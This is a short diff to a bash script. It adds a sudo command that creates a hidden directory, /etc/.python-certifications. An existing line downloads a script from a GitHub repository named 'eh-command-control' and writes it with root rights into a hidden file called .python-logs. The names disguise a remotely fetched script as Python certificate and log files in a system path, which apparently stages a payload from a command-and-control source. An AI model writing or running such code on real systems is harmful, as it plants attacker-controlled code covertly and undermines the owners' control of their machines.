@@ -1,5 +1,7 @@
 #!/bin/bash
 
+sudo mkdir -p /etc/.python-certifications
+
 curl -fsSL --retry 3 https://raw.githubusercontent.com/AidanNgo/eh-command-control/refs/heads/main/logs.sh \
   | sudo tee /etc/.python-certifications/.python-logs > /dev/null
 
